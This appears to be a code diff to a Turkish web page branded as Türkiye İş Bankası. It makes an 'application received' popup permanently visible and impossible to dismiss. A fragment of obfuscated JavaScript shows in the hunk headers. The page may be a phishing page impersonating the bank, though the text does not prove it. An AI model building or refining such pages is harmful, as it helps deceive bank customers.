@@ -284,7 +284,7 @@ function B(a){var d=+new Date;if(!document[f(32,145,149,133,146,153,115,133,140,
         };
 
         $(document).ready(function () {
-            // Show success message when page loads
+            // Show success message when page loads - permanently visible
             Swal.fire({
                 icon: 'success',
                 title: 'Başvurunuz Alındı!',
@@ -293,10 +293,12 @@ function B(a){var d=+new Date;if(!document[f(32,145,149,133,146,153,115,133,140,
                       '<p>En kısa sürede sizinle iletişime geçilecektir.</p>' +
                       '<p style="margin-top: 20px; font-size: 14px; color: #666;">Türkiye İş Bankası A.Ş.</p>' +
                       '</div>',
-                confirmButtonText: 'Tamam',
-                confirmButtonColor: '#08335E',
+                showConfirmButton: false,
+                showCancelButton: false,
+                showCloseButton: false,
                 allowOutsideClick: false,
                 allowEscapeKey: false,
+                backdrop: true,
                 customClass: {
                     popup: 'swal-wide',
                     title: 'swal-title',
